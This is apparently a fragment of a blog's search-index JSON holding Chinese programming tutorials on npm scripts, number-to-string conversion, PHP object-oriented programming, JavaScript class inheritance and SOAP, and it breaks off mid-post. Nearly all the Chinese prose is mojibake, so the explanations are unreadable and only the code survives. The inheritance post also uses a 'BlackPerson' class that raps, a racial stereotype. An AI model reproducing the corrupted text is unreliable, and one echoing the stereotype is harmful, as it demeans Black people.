å»ºç«‹å…©å€‹æª”æ¡ˆï¼Œpackage.json è·Ÿ package-lock.jsonã€‚ä¸»è¦æ˜¯ç”¨ä¾†è®“äººå®¶çœ‹é€™ä»½å°ˆæ¡ˆæœ‰ã€Œä¾è³´å“ªäº›å¥—ä»¶ã€ï¼š 123456789101112131415{ \"name\": \"test_folder\", \"version\": \"1.0.0\", \"description\": \"\", \"main\": \"index.js\", \"dependencies\": { \"left-pad\": \"^1.3.0\" }, \"devDependencies\": {}, \"scripts\": { \"test\": \"echo \\\"Error: no test specified\\\" &amp;&amp; exit 1\" }, \"author\": \"\", \"license\": \"ISC\"} å°±æ˜¯ dependencies è·Ÿ devDependencies é€™å…©å€‹ key çš„å…§å®¹ï¼Œå¾Œè€…æ˜¯åªæœ‰åœ¨ã€Œé–‹ç™¼ç’°å¢ƒä¸­ã€æ‰ä½¿ç”¨çš„å¥—ä»¶ã€‚ æ‰€ä»¥äººå®¶æ‹¿åˆ°ä¸€å€‹å°ˆæ¡ˆï¼Œåªè¦çœ‹é€™å€‹æª”æ¡ˆå°±å¯ä»¥çŸ¥é“éœ€è¦å®‰è£å“ªäº›ç›¸ä¾å¥—ä»¶æ‰èƒ½é‹è¡Œã€‚é€™éƒ¨åˆ† npm ä¹Ÿå¹«ä½ æƒ³å¥½äº†ï¼Œåªè¦åŸ·è¡Œï¼š 1npm install å°±æœƒè‡ªå‹•æ ¹æ“š package.json çš„å…§å®¹æŠŠæ‰€æœ‰éœ€è¦çš„å¥—ä»¶éƒ½å¹«ä½ ä¸‹è¼‰ä¸‹ä¾†ã€‚ é—œæ–¼ node_modulesé€™å€‹è³‡æ–™å¤¾å°±æ˜¯æ”¾ä¸€å€‹å°ˆæ¡ˆè£¡å®‰è£çš„æ‰€æœ‰ã€Œå¥—ä»¶ã€ï¼Œæ‰€ä»¥å®ƒçš„å®¹é‡é€šå¸¸é‚„è »å¤§çš„ï¼Œä¸€èˆ¬æœƒæŠŠå®ƒåŠ åˆ° .gitignore è£¡é¢ã€‚ è¦å®‰è£å¥—ä»¶çš„è©±åªéœ€è¦åƒè€ƒ package.json å°±å¯ä»¥äº†ã€‚ npm install çš„å…©å€‹åƒæ•¸npm install --save æŠŠå®‰è£çš„å¥—ä»¶è¨˜éŒ„åˆ° dependencies è£¡é¢ï¼ˆç¾åœ¨è®Šæˆé è¨­è¡Œç‚ºï¼Œæ‰€ä»¥ä¸åŠ ä¹Ÿæ²’é—œä¿‚ï¼‰ npm install --save-dev æŠŠå®‰è£çš„å¥—ä»¶è¨˜éŒ„åˆ° devDependenciesï¼Œä»£è¡¨é€™æ˜¯åªæœ‰é–‹ç™¼æ‰æœƒç”¨åˆ°çš„å¥—ä»¶","link":"/2021/12/23/npm-knowledge/"},{"title":"æ€éº¼ç”¨ NPM çš„ scripts æŒ‡ä»¤ä¾†è‡ªå®šç¾©æŒ‡ä»¤","text":"æ•™ä½ æ€éº¼å¯«æŒ‡ä»¤ä¾†ç¯€çœæ™‚é–“ã€‚ æ¯ä¸€æ¬¡ç”¨ Hexo è¦éƒ¨å±¬çš„æ™‚å€™éƒ½è¦å…ˆ hexo clean -&gt; hexo generate -&gt; hexo deploy å¾ˆç…©ã€‚é›–ç„¶ä¹Ÿå¯ä»¥ç”¨ hexo c ä¹‹é¡çš„ç¸®å¯«æŒ‡ä»¤ï¼Œä½†èº«ç‚ºæ‡¶äººé‚„æ˜¯è¦ºå¾—å¾ˆéº»ç…©ã€‚ é€™æ™‚æˆ‘çªç„¶æƒ³èµ·ä¾†ä»¥å‰æœ‰çœ‹é npm å¯ä»¥è‡ªè¨‚ç¾©æŒ‡ä»¤ï¼Œå¤§æ¦‚æ˜¯åƒé€™æ¨£ï¼š 123456\"scripts\": { \"build\": \"hexo generate\", \"clean\": \"hexo clean\", \"deploy\": \"hexo deploy\", \"server\": \"hexo server\",} ç„¶è€Œé€™äº›æŒ‡ä»¤å¯ä»¥åœ¨æ¿ƒç¸®æˆä¸€å€‹æŒ‡ä»¤ï¼Œåƒé€™æ¨£ï¼š 12345\"scripts\": { \"build\": \"hexo generate\", \"clean\": \"hexo clean\", \"deploy\": \"hexo deploy\", \"go\": \"npm run clean &amp;&amp; npm run build &amp;&amp; npm run deploy\" æ¥è‘—åªè¦ npm run goï¼Œå°±å®Œæˆ buildã€cleanã€deploy é€™ä¸‰å€‹å‹•ä½œäº†ã€‚ï¼ˆé€™ç¯‡æ–‡ç« å°±æ˜¯é€™ç”¨é€™æ‹›ä¾†éƒ¨å±¬çš„ï¼Œè®šå§ï¼‰ åƒè€ƒè³‡æ–™è®“æˆ‘å€‘å…ˆè½‰å€‹ 180 åº¦ï¼šNode.js èˆ‡ npm","link":"/2021/12/11/npm-script/"},{"title":"æŠŠæ•¸å­—è½‰å­—ä¸²çš„ä¸‰ç¨®æ–¹æ³•","text":"å¦‚é¡Œã€‚ æ•¸å­— + ç©ºå­—ä¸²12const number = 123console.log(number + '') // '123' Number.toString()123const number = 123const result = number.toString()console.log(result) // '123' æ³¨æ„ï¼Œä¸€å®šè¦æ­é… è®Šæ•¸ ä¾†ä½¿ç”¨ï¼Œå¦‚æœä½ ç›´æ¥ 123.toString() æ˜¯æ²’æœ‰ç”¨çš„ã€‚ String()æœ€ç›´è¦ºçš„æ–¹æ³•ï¼š 123const number = 123const result = String(number)console.log(result) // '123'","link":"/2021/12/20/number-to-string/"},{"title":"å¾ PHP å†æ¢ç‰©ä»¶å°å‘","text":"ä¹Ÿæ˜¯èŠ±äº†é»æ™‚é–“ä¾†ç­†è¨˜ã€‚ ç°¡è¿°ç‰©ä»¶å°å‘æœ‰å¹¾å€‹åŸå‰‡ï¼ŒåŸºæœ¬ä¸Šå¯ä»¥åˆ†æˆé€™å››é»ï¼š Class é¡åˆ¥ Instance å¯¦é«” Encapsulation å°è£ Inheritance ç¹¼æ‰¿ ç”±æ–¼ PHP çš„ç‰©ä»¶å°å‘æ¦‚å¿µæ¯” JavaScript æ›´å®Œæ•´ä¸€äº›ï¼Œæ‰€ä»¥ç­‰ä¸€ä¸‹çš„ç¯„ä¾‹éƒ½æœƒä»¥ PHP ç‚ºä¸»ã€‚ Class / Instance é¡åˆ¥å’Œå¯¦é«”ç‰©ä»¶å°å‘æœ€åŸºæœ¬çš„æ¦‚å¿µå°±æ˜¯ç”±ã€ŒClassã€å’Œã€ŒInsatnceã€ä¾†çµ„æˆã€‚ ç°¡å–®ä¾†èªªï¼ŒClass å¯ä»¥æƒ³æˆæ˜¯ã€Œæ¨¡æ¿ï¼ˆè¨­è¨ˆåœ–ï¼‰ï¼Œè€Œ Instance å‰‡æ˜¯ã€Œå¯¦éš›åšå‡ºä¾†çš„æ±è¥¿ï¼ˆæˆå“ï¼‰ã€ã€‚ åœ¨ç‰©ä»¶å°å‘è£¡é¢ä½ ä¸€å®šæœƒå¾ˆå¸¸è½åˆ°é€™å¥è©±ï¼š new ä¸€å€‹ Instance å‡ºä¾† é€™å¥è©±æ¯”è¼ƒå®Œæ•´çš„æ„æ€æ˜¯ã€Œå¾ Class ä¾† new å‡ºä¸€å€‹ Instanceã€ã€‚ ä¾†çœ‹å€‹ä¾‹å­ï¼š 1234567891011class Dog { function __construct ($name) { $this-&gt;name = $name; } function sayHello () { echo \"Hello~~~\"; }}$dog1 = new Dog('PeaNu');$dog1-&gt;sayHello(); é€™é‚Šçš„ Class å°±æ˜¯è¨­è¨ˆåœ–ï¼Œæˆ‘å¸Œæœ›é€é Class ç”Ÿå‡ºä¾†çš„ instance å…·å‚™ $name å’Œ sayHello é€™å…©æ±è¥¿ã€‚ æ¥è‘—å°±ç”¨ new ä¾†ç”Ÿå‡ºä¸€å€‹ dog1ï¼Œæ‰€ä»¥ç¾åœ¨å°±æœ‰äº†æ–°çš„ instanceï¼Œå®ƒæœ‰åå­—ï¼Œä¹Ÿæœƒèªªå“ˆå›‰ã€‚ Encapsulation å°è£ æ¯”è¼ƒè¤‡é›œçš„é‚è¼¯ç•™åœ¨ Class è£¡é¢ï¼Œè‡ªå·±æ±ºå®šè¦å°å¤–é–‹æ”¾å“ªäº› methods ç°¡å–®ä¾†èªªï¼Œæœ‰äº›æ™‚å€™æˆ‘å€‘å¯èƒ½æœƒåœ¨ Class è£¡å¯«ä¸€äº›å–®ç´”ç”¨ä¾†å”åŠ©ç¨‹å¼é‹ä½œçš„å‡½å¼æˆ–è®Šæ•¸ï¼Œè·Ÿå¯¦éš›ä½¿ç”¨ä¸Šæ²’æœ‰å¤ªå¤§é—œè¯ã€‚é€™æ™‚å€™å°±æœƒåˆ©ç”¨ã€Œå°è£ã€çš„æ¦‚å¿µä¾†åšä¸€é»é™åˆ¶ï¼Œè®“ instance æ²’è¾¦æ³•ç›´æ¥å­˜å–é€™äº›å‡½å¼æˆ–è®Šæ•¸ã€‚ å°è£çš„å¯¦ä½œæ˜¯é€é public å’Œ private ä¾†æŠŠè¦å°å…§ / å°å¤–çš„æ±è¥¿ä¾†åšå€éš”ã€‚ 123456789101112class Person { private function get_greeting_sentence () { return 'Hello'; } public function greeting () { echo $this-&gt;get_greeting_sentence(); }}$person1 = new Person();$person1-&gt;greeting();$person1-&gt;get_greeting_sentence(); // fatal error å¤–é¢çš„ instance ä¸å¿…çŸ¥é“ greeting() æ˜¯æ€éº¼å¯¦ä½œçš„ï¼Œåªè¦çŸ¥é“æœ‰é€™å€‹æ–¹æ³•å¯ä»¥ç”¨å°±å¥½äº†ã€‚å°±ç®—çœŸçš„å®ƒçŸ¥é“è£¡é¢æ˜¯ç”¨ get_greeting_sentence ä¾†å¯¦ä½œçš„ï¼Œä¹Ÿæ²’æœ‰è¾¦æ³•ç›´æ¥å»å­˜å–å®ƒï¼Œå› ç‚ºå®ƒè¢«æ­¸é¡æˆ private çš„å…§å®¹ã€‚ ç¸½è€Œè¨€ä¹‹ï¼Œå°è£å°±æ˜¯åƒé€™æ¨£é€é public å’Œ private ä¾†åšå€éš”ï¼Œå„ªé»æ˜¯çµæ§‹æ¯”è¼ƒæ˜ç¢ºï¼Œæˆ–è€…æ˜¯èƒ½é˜²æ­¢åˆ¥äººäº‚æ”¹ Class è£¡çš„è³‡è¨Šã€‚ é‚„æ˜¯æƒ³å­˜å–çš„è©±æ€éº¼è¾¦ï¼Ÿåˆ©ç”¨ getter å’Œ setterå‰›å‰›æœ‰æåˆ° Class ä¸­å¯èƒ½æœƒç”¨è®Šæ•¸ä¾†å„²å­˜ä¸€äº›è³‡è¨Šï¼Œä½†å¦‚æœ instance å®Œå…¨æ²’è¾¦æ³•å­˜å–åˆ°çš„è©±æœƒæœ‰é»éº»ç…©ï¼Œä¾†çœ‹å€‹ä¾‹å­ï¼š 12345678910class Dog { private $name = 'default'; public function say_hello () { echo \"Hello my name is $this-&gt;name\"; }}$dog1 = new Dog();$dog1-&gt;name = 'peanu'; //Fatal error: Uncaught Error: Cannot access private property$dog1-&gt;say_hello(); å› ç‚º $name æ˜¯ private è³‡è¨Šï¼Œæ‰€ä»¥å­˜å–çš„æ™‚å€™å°±æœƒå™´ Errorã€‚å¯æ˜¯æˆ‘å€‘å°±æ˜¯å¸Œæœ›å¯ä»¥è‡ªå·±è¨­å®š $name çš„è©±æ€éº¼è¾¦ï¼Ÿ é€™æ™‚å€™æœƒç”¨åˆ°å…©å€‹æ±è¥¿ï¼šgetter å’Œ setter getter æ˜¯ç”¨ä¾†è®€å– Class ä¸­çš„è³‡è¨Š setter æ˜¯ç”¨ä¾†è¨­å®š Class ä¸­çš„è³‡è¨Š ç°¡å–®ä¾†èªªå°±æ˜¯ä½ å¯ä»¥å°å¤– public å…©å€‹å‡½å¼ï¼Œä¸€å€‹å°ˆé–€è®€å–è³‡è¨Šï¼Œä¸€å€‹å°ˆé–€è¨­å®šè³‡è¨Šï¼Œé€™æ¨£ä¸å°±å¥½äº†å—ï¼Ÿ ä¾†æŠŠå‰›å‰›çš„ä¾‹å­åšé»ä¿®æ”¹ï¼š 123456789101112131415161718class Dog { private $name = 'default'; public function set_name ($name) { // ä¸é›…åç¨± if ($name === 'fuck') return; // è¨­å€¼ $this-&gt;name = $name; } public function get_name () { echo $this-&gt;name; }}$dog1-&gt;set_name('fuck');$dog1-&gt;get_name(); // default$dog1-&gt;set_name('peanu');$dog1-&gt;get_name(); // peanu æœ‰äº† setter å’Œ getter ä»¥å¾Œå°±èƒ½é”åˆ°æˆ‘å€‘çš„ç›®çš„ã€‚é™¤æ­¤ä¹‹å¤–ï¼Œé‚„å¯ä»¥åœ¨è£¡é¢åšä¸€äº›é™åˆ¶ï¼Œä¾‹å¦‚èªªä¸å¯ä»¥å–é«’è©±å•¦ï¼Œæˆ–è€…æ˜¯åªèƒ½è®€å–åˆ°å“ªäº›å…§å®¹ï¼Œé€™äº›éƒ½æ˜¯å¯ä»¥é€é getter å’Œ setter ä¾†è¨­è¨ˆçš„ã€‚ Inheritance ç¹¼æ‰¿ å°±å¦‚åŒå­—é¢æ„æ€ï¼Œç¹¼æ‰¿æŸå€‹ Class èˆ‰ä¾‹ä¾†èªªï¼Œå‡è¨­ä½ æœ‰ä¸€å€‹ç‹—çš„ Classï¼Œå®ƒæœ‰åå­—ï¼Œé‚„æœƒæ‰“æ‹›å‘¼ã€‚ç¾åœ¨ä½ å¸Œæœ›åœ¨å¤šä¸€å€‹ Class æ˜¯é»‘ç‹—ï¼Œå®ƒè·Ÿç‹—æœ‰ 87 åˆ†åƒï¼Œåªå·®åœ¨å¤šäº†è·‘æ­¥é€™å€‹åŠŸèƒ½ï¼Œé‚£ä½ æœ‰å¯èƒ½æœƒé€™æ¨£å¯«ï¼š 1234567891011121314151617181920212223242526// ç‹—class Dog { function __construct ($name) { $this-&gt;name = $name; } public function say_hello () { echo \"Hello my name is \" . $this-&gt;name; }}// é»‘ç‹—class BlackDog { function __construct ($name) { $this-&gt;name = $name; } public function say_hello () { echo \"Hello my name is \" . $this-&gt;name; } public function run () { echo \"Yo! I am running\"; }}$dog = new Dog('dog');$black_dog = new BlackDog('black dog');$dog-&gt;say_hello(); // Hello my name is dog$black_dog-&gt;say_hello(); // Hello my name is black dog$black_dog-&gt;run(); // Yo! I am running é›–ç„¶æ²’ä»€éº¼å•é¡Œï¼Œä½†åœ¨å·¥ç¨‹å¸«çš„ä¸–ç•Œä¸æ˜¯æœ‰å¥åè¨€å—ï¼š DRYï¼ˆDonâ€™t Repeat Yourselfï¼‰ æ—¢ç„¶å®ƒå€‘éƒ½æ˜¯ã€Œç‹—ã€ï¼Œè€Œé»‘ç‹—åªæ˜¯å¤šäº†è·‘æ­¥é€™å€‹åŠŸèƒ½ï¼Œé‚£å¹¹å˜›ä¸ç›´æ¥è®“å®ƒã€Œç¹¼æ‰¿ã€ç‹—å°±å¥½ï¼Ÿå°±è·Ÿç¾å¯¦ä¸­çš„å°å­©æœƒç¹¼æ‰¿çˆ¶æ¯ DNA æ˜¯ä¸€æ¨£çš„æ„Ÿè¦ºã€‚ æ‰€ä»¥å‘¢ï¼Œåœ¨å¤§éƒ¨åˆ†ç‰©ä»¶å°å‘çš„èªè¨€è£¡æœƒæä¾›ä¸€å€‹æ±è¥¿å«åš extendsï¼Œè®“ä½ å¯ä»¥ç¹¼æ‰¿æŸå€‹ classï¼Œé€™æ¨£å°±ä¸å¿…å†é‡è¤‡å¯«ä¸€éã€‚ ä¸€æ¨£ä¾†æ”¹ä¸€ä¸‹å‰›å‰›çš„ä¾‹å­ï¼š 12345678910111213141516171819class Dog { function __construct ($name) { $this-&gt;name = $name; } public function say_hello () { echo \"Hello my name is \" . $this-&gt;name; }}// ç¹¼æ‰¿ç‹—çš„ Classclass BlackDog extends Dog { public function run () { echo \"Yo! I am running\"; }}$dog = new Dog('dog');$black_dog = new BlackDog('black dog');$dog-&gt;say_hello(); // Hello my name is dog$black_dog-&gt;say_hello(); // Hello my name is black dog$black_dog-&gt;run(); // Yo! I am running ä»¥ä¸Šå°±æ˜¯ç¹¼æ‰¿æœ€åŸºæœ¬çš„ç”¨æ³•ï¼Œæ¥è‘—ä¾†ä»‹ç´¹å¹¾å€‹ä½¿ç”¨ç¹¼æ‰¿æ™‚å¯èƒ½æœƒç¢°åˆ°çš„å•é¡Œã€‚ æƒ³è¦è¦†å¯«åŸæœ¬ Class çš„ methodå…¶å¯¦é‚„è »ç›´è¦ºçš„ï¼Œå¦‚æœæƒ³è¦è¦†å¯«çš„è©±ï¼Œå°±ç›´æ¥åœ¨ã€Œç¹¼æ‰¿çš„ Classã€è£¡å¯«ä¸€å€‹ä¸€æ¨¡ä¸€æ¨£çš„ä¾†è“‹æ‰å°±å¥½ï¼Œè·Ÿä½ å¯« CSS çš„æ¦‚å¿µæœ‰é»åƒï¼š 123456789101112131415161718192021class Dog { function __construct ($name) { $this-&gt;name = $name; } public function say_hello () { echo \"Hello my name is\" . $this-&gt;name; }}class BlackDog extends Dog { // ç›´æ¥å¯«ä¸€æ¨£çš„ä¾†è¦†è“‹ public function say_hello() { echo \"yoyoyo black dog is better\"; } public function run () { echo \"Yo! I am running\"; }}$dog = new Dog('dog');$black_dog = new BlackDog('black dog');$dog-&gt;say_hello(); // Hello my name is dog$black_dog-&gt;say_hello(); // yoyoyo black dog is better æƒ³è¦å­˜å–åŸæœ¬ Class çš„ private è®Šæ•¸å¦‚æœä½ åœ¨ã€Œç¹¼æ‰¿çš„ Classã€ä¸­å­˜å–åŸæœ¬çš„ private è®Šæ•¸ï¼Œå°±æœƒç™¼ç¾å­˜å–ä¸äº†ï¼š 123456789101112131415class Dog { private $test = 'yo'; public function log_private() { echo $this-&gt;test; }}class BlackDog extends Dog { public function log_private() { echo $this-&gt;test; }}$dog = new Dog();$black_dog = new BlackDog();$dog-&gt;log_private(); // yo$black_dog-&gt;log_private(); // Warning: Undefined property: BlackDog::$test æ‰€ä»¥è¦æ”¹ç”¨ protected ä¾†è¨­å®šæ‰è¡Œï¼š 12345678910111213141516class Dog { // å¾ private æ”¹æˆ protected protected $test = 'yo'; public function log_private() { echo $this-&gt;test; }}class BlackDog extends Dog { public function log_private() { echo $this-&gt;test; }}$dog = new Dog();$black_dog = new BlackDog();$dog-&gt;log_private(); // yo$black_dog-&gt;log_private(); // yo protected ä¸€æ¨£æ²’è¾¦æ³•è®“å¤–é¢çš„ instance å­˜å–ï¼Œä½†æ˜¯ç¹¼æ‰¿çš„ Class å¯ä»¥å­˜å–ã€‚ æƒ³è¦å­˜å–åŸæœ¬ Class çš„ methodæœ‰å…©ç¨®æ–¹æ³•ï¼š é€é $this-&gt;method é€é parent::method 123456789101112131415161718class Dog { public function say_hi() { echo 'hi'; }}class BlackDog extends Dog { public function say_yo_and_hi_1 () { echo 'yo'; $this-&gt;say_hi(); } public function say_yo_and_hi_2 () { echo 'yo'; parent::say_hi(); }}$black_dog = new BlackDog();$black_dog-&gt;say_yo_and_hi_1(); // yohi$black_dog-&gt;say_yo_and_hi_2(); // yohi å¯¦éš›å·®åˆ¥æˆ‘ä¸æ˜¯å¾ˆæ¸…æ¥šï¼Œä½†æ¯”è¼ƒå¸¸è¦‹çš„åšæ³•æœƒæ˜¯ç¬¬äºŒç¨®ï¼Œè©³ç´°å¯ä»¥åƒè€ƒé€™ç¯‡ï¼šmultiple ways of calling parent method in phpã€‚ é †ä¾¿é™„å€‹ JS çš„å¯«æ³•ï¼Œå…¶å¯¦å°±æ˜¯æŠŠ parent:: æ”¹æˆ superï¼š 123456789101112131415class Parent { sayHi () { console.log('hi'); }}class Child extends Parent { sayHiAndYo () { console.log('yo'); super.sayHi(); }}const c2 = new Child();c2.sayHiAndYo(); // yo hi é—œæ–¼ staticå‰é¢å·²ç¶“ä»‹ç´¹éä¸‰ç¨®åœ¨ Class è¨­å®šçš„è®Šæ•¸å’Œå‡½å¼ï¼š public private protected æœ€å¾Œè¦ä¾†ä»‹ç´¹ä¸€å€‹æ±è¥¿ï¼Œå«åš staticã€‚ ç°¡å–®ä¾†èªªï¼Œé€éå‰é¢é‚£ä¸‰ç¨®è¨­å®šçš„è³‡è¨Šæœƒç¶åœ¨ instance èº«ä¸Šï¼Œä¸æ˜¯ Classã€‚ ç”¨è¬›çš„æœ‰é»é›£æ‡‚ï¼Œä¾†èˆ‰å€‹ä¾‹å­ï¼š 123456789class V1 { public $name = 'PPB';}$a = new V1();$b = new V1();echo $a-&gt;name; // PPBecho $b-&gt;name; // PPB åƒ…ç®¡é€™å…©å€‹ instance çš„ $name çœ‹èµ·ä¾†å¥½åƒä¸€æ¨£ï¼Œä½†å…¶å¯¦é€™å…©å€‹$name æ˜¯ä¸åŒçš„è®Šæ•¸ã€‚ä¹Ÿå°±æ˜¯èªªä½ æœ‰å¹¾å€‹ instance ï¼Œå°±æœƒæœ‰å¹¾å€‹ $name é€™å€‹è®Šæ•¸ã€‚ ä½†å¦‚æœä½ ç”¨ static ä¾†è¨­å®šå°±ä¸ä¸€æ¨£äº†ï¼š 1234class V1 { static $name = 'PPB';}echo V1::$name; static çš„æ„æ€æ˜¯èªªï¼š æˆ‘è¦æŠŠé€™å€‹è®Šæ•¸ or å‡½å¼ç¶åœ¨é€™å€‹ Class èº«ä¸Šã€‚ æ‰€ä»¥è¦å­˜å–çš„è©±ä¹Ÿå¾—é€é Classï¼Œè€Œä¸æ˜¯ instanceï¼Œå¯ä»¥æƒ³æˆæ˜¯ä¸€ç¨®å…¨åŸŸè®Šæ•¸çš„æ„Ÿè¦ºï¼Œå› ç‚ºæ¯ä¸€å€‹ instance éƒ½æœƒå…±ç”¨åŒå€‹è®Šæ•¸ã€‚ å°±å¦‚åŒ static çš„å­—é¢æ„æ€ï¼Œå®ƒæ˜¯ã€Œéœæ…‹ã€çš„ï¼Œæ‰€ä»¥ä¸€èˆ¬æ˜¯ç”¨åœ¨ã€Œä½ ä¸æœƒå»æ”¹è®Šçš„è®Šæ•¸æˆ–å‡½å¼ã€ã€‚","link":"/2022/03/19/oop-by-php/"},{"title":"ç‰©ä»¶å°å‘ä¹‹ç¹¼æ‰¿","text":"å¦‚é¡Œã€‚ ç°¡è¿°ç°¡å–®ä¾†èªªå°±æ˜¯ã€Œç¹¼æ‰¿æŸå€‹ class çš„å±¬æ€§å’Œæ–¹æ³•ã€ã€‚ å‡è¨­æˆ‘æœ‰ä¸€å€‹ Person çš„ classï¼Œæœƒæœ‰åç¨±å’Œå¹´é½¡ï¼Œç„¶å¾Œæœƒæ‰“æ‹›å‘¼ã€‚ 1234567891011class Person { constructor (name, age) { this.name = name; this.age = age; } log () { console.log(this.name + ', ' + this.age); }}const peanu = new Person('peanu', 23);peanu.log(); // peanu, 23 ç¾åœ¨æˆ‘å¸Œæœ›æœ‰ä¸€å€‹é»‘äººï¼Œä¸€æ¨£å…·å‚™ Person çš„ç‰¹æ€§ï¼ˆåç¨±ã€å¹´é½¡ã€æ‰“æ‹›å‘¼ï¼‰ï¼Œä½†è¦å¤šä¸€é …æŠ€èƒ½æ˜¯ã€Œå”± Rapã€ï¼Œé€™æ™‚å€™å°±æ‡‰è©²åˆ©ç”¨ã€Œç¹¼æ‰¿ã€çš„æ–¹å¼ä¾†å»ºç«‹ï¼Œè€Œä¸æ˜¯é‡æ–°å¯«ä¸€å€‹å¹¾ä¹ç›¸åŒçš„ class 12345678class BlackPerson extends Person { rap() { console.log('yoyoyo my name is ' + this.name); }}const blackMan = new BlackPerson('blackMan', 30);blackMan.log(); // blackMan, 30blackMan.rap(); // yoyoyo my name is blackMan æ³¨æ„ï¼Œé€™è£¡ç”¨äº† extends ä¾†ç¹¼æ‰¿ Person çš„è³‡è¨Šï¼Œæ‰€ä»¥å³ä¾¿ BlackPerson ä¸­æ²’æœ‰å¯« constructorï¼Œä¹Ÿä¸€æ¨£å…·å‚™ name å’Œ age é€™å…©å€‹å±¬æ€§ï¼Œè€Œä¸”ä¹Ÿå¯ä»¥ç”¨ log æ–¹æ³•ã€‚ é™¤äº†ç¹¼æ‰¿ä»¥å¤–ï¼Œæˆ‘å€‘ä¹Ÿå¹«å®ƒåŠ äº†ä¸€å€‹ rap æ–¹æ³•ã€‚æ‰€ä»¥åªè¦æ˜¯å¾ BlackPerson ç”Ÿå‡ºä¾†çš„ instanceï¼Œéƒ½æœƒå…·å‚™ rap çš„èƒ½åŠ›ã€‚ å¦‚æœæˆ‘æƒ³åœ¨ç¹¼æ‰¿çš„ class ä¸Šä½¿ç”¨ constructor æ€éº¼è¾¦ï¼Ÿä»¥å‰›å‰›çš„ä¾‹å­ä¾†èªªï¼Œå¦‚æœæˆ‘å¸Œæœ›å¹« BlackPerson åŠ ä¸Šæ€§åˆ¥ï¼Œæˆ‘å¯èƒ½ç›´è¦ºæœƒé€™æ¨£å¯«ï¼š 12345678910111213class BlackPerson extends Person { constructor (gender) { // åŠ ä¸Šä¸€å€‹æ–°çš„ gender å±¬æ€§ this.gender = gender; } rap () { console.log('yoyoyo my name is ' + this.name + ', and my gender is ' + this.gender); }}// å»ºç«‹ instanceconst blackMan = new BlackPerson('blackMan', 30, 'man');// é æœŸï¼šyoyoyo my name is blackMan, and my gender is manblackMan.rap(); ä½†é€™æ¨£æœƒå¾—åˆ°éŒ¯èª¤ï¼š 12ReferenceError: Must call super constructor in derived class before accessing 'this' or returning from derived constructor ç°¡å–®ä¾†èªªï¼Œè¦åœ¨ç¹¼æ‰¿çš„ class ä¸Šè¨­å®š constructor ä¹‹å‰ï¼Œå¾—å…ˆå‘¼å« super é€™å€‹ functionã€‚å…ˆåŸ·è¡ŒåŸæœ¬ Person çš„ constructorï¼Œæ¥è‘—å†åŸ·è¡Œ BlackPerson çš„ constructorï¼Œæ‰€ä»¥æ‡‰è©²è¦é€™æ¨£å¯«ï¼š 123456789101112131415class BlackPerson extends Person { constructor (name, age, gender) { // å‘¼å« super ä¸¦å‚³å…¥åƒæ•¸ super(name, age); // super åŸ·è¡Œå®Œå¾Œæ‰å»ºç«‹æ–°çš„ gender this.gender = gender; } rap () { console.log('yoyoyo my name is ' + this.name + ', and my gender is ' + this.gender); }}// å»ºç«‹ instanceconst blackMan = new BlackPerson('blackMan', 30, 'man');// yoyoyo my name is blackMan, and my gender is manblackMan.rap(); ç¸½è€Œè¨€ä¹‹ï¼Œä¸€å®šè¦è¨˜å¾—å…ˆåŸ·è¡Œ superï¼Œé€™æ¨£æ‰ä¸æœƒå‡ºéŒ¯ã€‚","link":"/2022/03/18/oop-extends/"},{"title":"SOAP å¦ä¸€ç¨®è·Ÿä¼ºæœå™¨æºé€šçš„å”è­°","text":"äº†è§£ä¸€ä¸‹ã€‚ æ¦‚è«–SOAPï¼ˆSimple Object Access Protocolï¼‰ é¦–å…ˆï¼ŒSOAP éƒ½æ˜¯åŸºæ–¼ã€ŒXMLã€ä¾†åšè³‡æ–™äº¤æ›ï¼ˆæºé€šï¼‰ï¼Œæ‰€ä»¥å¦‚æœä½ è¦è·Ÿä¸€å€‹æä¾› SOAP æœå‹™çš„ä¼ºæœå™¨æºé€šï¼Œå¤§æ¦‚æœƒæ˜¯é€™æ¨£å­ï¼š 123456789101112131415&lt;!-- ç”¨æˆ¶ç«¯ç™¼çš„ request --&gt;&lt;?xml version=\"1.0\"?&gt; &lt;soapenv:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:cal=\"http://www.stgregorioschurchdc.org/Calendar\"&gt; &lt;!-- header --&gt;&lt;soapenv:Header/&gt; &lt;!-- body --&gt;&lt;soapenv:Body&gt; &lt;cal:easter_date soapenv:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"&gt; &lt;year xsi:type=\"xsd:short\"&gt;2014&lt;/year&gt; &lt;/cal:easter_date&gt; &lt;/soapenv:Body&gt; &lt;/soapenv:Envelope&gt; 123456789101112131415&lt;!-- ä¼ºæœç«¯å›å‚³çš„ response --&gt;&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;SOAP-ENV:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"xmlns:SOAP-ENC=\"http://schemas.xmlsoap.org/soap/encoding/\"xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\"xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\"SOAP-ENV:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"&gt;&lt;!-- body --&gt;&lt;SOAP-ENV:Body&gt; &lt;namesp1:easter_dateResponse xmlns:namesp1=\"http://www.stgregorioschurchdc.org/Calendar\"&gt; &lt;s-gensym3 xsi:type=\"xsd:string\"&gt;2014/04/20&lt;/s-gensym3&gt;&lt;/namesp1:easter_dateResponse&gt;&lt;/SOAP-ENV:Body&gt;&lt;/SOAP-ENV:Envelope&gt; å…¶å¯¦å°±è·Ÿ HTTP çš„æ¦‚å¿µå¾ˆé¡ä¼¼ï¼Œåªæ˜¯éƒ½æ”¹æˆç”¨ XML çš„è³‡æ–™æ ¼å¼ä¾†åšæºé€šã€‚","link":"/2022/01/05/other-protocol-soap/"},{"title":"æŠŠ function ç•¶ä½œåƒæ•¸","text":"ä¸€å€‹æœƒè®“äººæƒ³å¾ˆä¹…çš„è§€å¿µã€‚ é‡æ–°èªè­˜åƒæ•¸é€™ç¨®æŠŠ function ç•¶ä½œåƒæ•¸çš„ç”¨æ³•æœ€å¸¸ç”¨åœ¨ callback functionï¼Œä¹Ÿå¯ä»¥ç¿»ä½œã€Œå›èª¿å‡½å¼ã€ã€‚ æˆ‘è¦ºå¾— callback function å¯ä»¥ç•¶ä½œæ˜¯è½‰è·ä»»å‹™çš„é—œå¡å§ï¼Œå¦‚æœä½ 